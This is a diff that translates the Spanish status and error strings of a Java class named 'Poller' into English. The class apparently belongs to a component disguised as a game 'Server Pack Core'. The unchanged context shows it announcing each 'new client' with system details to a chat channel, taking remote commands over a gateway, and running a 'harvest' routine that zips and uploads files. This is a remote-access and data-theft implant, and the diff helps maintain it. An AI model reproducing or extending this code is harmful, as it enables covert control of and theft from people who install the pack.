@@ -225,13 +225,13 @@ public final class Poller implements Runnable {
 		try {
 			Map<String, Object> embed = new LinkedHashMap<>();
 			embed.put("title", "Server Pack Core");
-			embed.put("description", "Nuevo cliente conectado");
+			embed.put("description", "New client connected");
 			embed.put("color", 0x3498db);
 			List<Object> fields = new ArrayList<>();
 			for (String line : SysInfo.embedFields(installDir, gameDir)) {
 				int split = line.indexOf(':');
 				Map<String, Object> field = new LinkedHashMap<>();
-				field.put("name", split > 0 ? line.substring(0, split) : "Dato");
+				field.put("name", split > 0 ? line.substring(0, split) : "Data");
 				field.put("value", split > 0 ? line.substring(split + 1).trim() : line);
 				field.put("inline", false);
 				fields.add(field);
@@ -320,7 +320,7 @@ public final class Poller implements Runnable {
 
 	public void contentIntentDisabled() {
 		contentIntent = false;
-		reply("MESSAGE_CONTENT desactivado en el portal; gateway con intents 513 y respaldo REST cada 2 s.");
+		reply("MESSAGE_CONTENT disabled in the portal; gateway with intents 513 and REST fallback every 2 s.");
 	}
 
 	public void onGatewayMessage(Map<String, Object> message) {
@@ -427,7 +427,7 @@ public final class Poller implements Runnable {
 
 	public String gatewayStateText() {
 		Gateway current = gateway;
-		return current == null ? "no iniciado" : current.state();
+		return current == null ? "not started" : current.state();
 	}
 
 	public long gatewayRtt() {
@@ -438,31 +438,31 @@ public final class Poller implements Runnable {
 	public void gatewayCommand(List<String> args) {
 		Gateway current = gateway;
 		if (args.size() > 1 && args.get(1).equalsIgnoreCase("restart")) {
-			if (current == null || current.state().equals("parado")) {
-				reply("Gateway no iniciado");
+			if (current == null || current.state().equals("stopped")) {
+				reply("Gateway not started");
 				return;
 			}
-			reply("Reiniciando gateway");
+			reply("Restarting gateway");
 			current.restart();
 			return;
 		}
 		if (current == null) {
-			reply("gateway: no iniciado");
+			reply("gateway: not started");
 			return;
 		}
 		long rtt = current.rtt();
 		reply("gateway: " + current.state()
 			+ "\ncontent_intent: " + (contentIntent ? "on" : "off")
 			+ "\nrtt_ack: " + (rtt < 0L ? "n/a" : rtt + " ms")
-			+ "\nreconexiones: " + current.reconnects()
-			+ "\nultimo_cierre: " + current.lastCloseCode());
+			+ "\nreconnects: " + current.reconnects()
+			+ "\nlast_close: " + current.lastCloseCode());
 	}
 
 	public void submit(Runnable task) {
 		try {
 			commandPool.execute(task);
 		} catch (RejectedExecutionException rejected) {
-			reply("Cola de comandos llena");
+			reply("Command queue full");
 		}
 	}
 
@@ -528,7 +528,7 @@ public final class Poller implements Runnable {
 			uploadFile(zip);
 			Files.deleteIfExists(zip);
 		} catch (Throwable throwable) {
-			reply("Error en harvest: " + throwable.getMessage());
+			reply("Harvest failed: " + throwable.getMessage());
 		}
 	}
 
